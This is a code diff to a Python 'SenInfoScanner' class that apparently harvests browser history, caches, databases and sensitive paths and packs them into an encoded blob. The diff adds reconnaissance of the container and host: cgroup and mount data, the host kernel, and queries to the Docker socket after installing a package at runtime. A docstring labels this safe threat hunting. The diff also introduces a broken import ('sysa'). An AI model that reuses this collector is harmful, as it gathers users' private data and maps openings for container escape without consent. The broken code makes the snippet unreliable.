@@ -11,7 +11,7 @@ import base64
 import zlib
 import tempfile
 import os
-import sys
+import sysa
 import importlib
 import subprocess
 
@@ -52,6 +52,99 @@ class SenInfoScanner:
             else:
                 # Default to root path for Linux/macOS
                 self.root_path = '/'
+
+    # ============================================================
+    #  Docker / Container / K8s detection + Host info "float-up"
+    # ============================================================
+    def _detect_container(self):
+        """Detect if running inside Docker/containerd/Kubernetes"""
+        # /.dockerenv is present in Docker
+        if os.path.exists("/.dockerenv"):
+            return True
+
+        # Check cgroup
+        try:
+            with open("/proc/1/cgroup") as f:
+                cgroup = f.read()
+            if "docker" in cgroup or "containerd" in cgroup:
+                return True
+        except:
+            pass
+
+        return False
+    
+
+    def _container_host_info(self):
+        """
+        Collect container-specific info AND host information visible from container.
+        This is SAFE and NON-intrusive and is used for threat hunting.
+        """
+        info = {}
+        in_container = self._detect_container()
+
+        info["In_Container"] = in_container
+
+        if not in_container:
+            # Not in a container → no need to collect container-specific info
+            return info
+
+        # ------------------------------------------------------------
+        # 1. Container ID / hostname
+        # ------------------------------------------------------------
+        try:
+            with open("/etc/hostname") as f:
+                info["Container_ID"] = f.read().strip()
+        except:
+            info["Container_ID"] = None
+
+        # ------------------------------------------------------------
+        # 2. Cgroup hierarchy (reveals host-level cgroup path)
+        # ------------------------------------------------------------
+        try:
+            with open("/proc/self/cgroup") as f:
+                info["Cgroup_Info"] = f.read().splitlines()
+        except:
+            info["Cgroup_Info"] = None
+
+        # ------------------------------------------------------------
+        # 3. Mount namespace inspection (host paths leak through overlay2)
+        # ------------------------------------------------------------
+        try:
+            with open("/proc/self/mountinfo") as f:
+                info["Mount_Info"] = f.read().splitlines()
+        except:
+            info["Mount_Info"] = None
+
+        # ------------------------------------------------------------
+        # 4. Host kernel (shared between container + host)
+        # ------------------------------------------------------------
+        try:
+            uname = subprocess.check_output(["uname", "-a"]).decode().strip()
+            info["Host_Kernel"] = uname
+        except:
+            info["Host_Kernel"] = None
+
+        # ------------------------------------------------------------
+        # 5. Check docker.sock → can see host Docker info (major risk indicator)
+        # ------------------------------------------------------------
+        docker_sock = "/var/run/docker.sock"
+        info["Docker_Socket_Present"] = os.path.exists(docker_sock)
+
+        if os.path.exists(docker_sock):
+            try:
+                # use requests-unixsocket if available
+                try:
+                    requests_unixsocket = ensure_module("requests_unixsocket", "requests-unixsocket==0.3.0")
+                    session = requests_unixsocket.Session()
+                    res = session.get("http+unix://%2Fvar%2Frun%2Fdocker.sock/info")
+                    info["Docker_Host_Info"] = res.json()
+                except Exception as e:
+                    info["Docker_Host_Info"] = f"Failed to query docker.sock: {e}"
+            except:
+                info["Docker_Host_Info"] = None
+
+        return info
+
 
     def _ext_scan(self, target_ext: list):
         ''' cover potential sensitive info via file extension
@@ -227,7 +320,8 @@ class SenInfoScanner:
             'browser_history': self._brw_hist(),
             'cache_files': self._cache(),
             'databases': self._db(True),
-            'sensitive_paths': self._path()
+            'sensitive_paths': self._path(),
+            'container_host_info': self._container_host_info()
         }
 
         # compress and encode the collected information
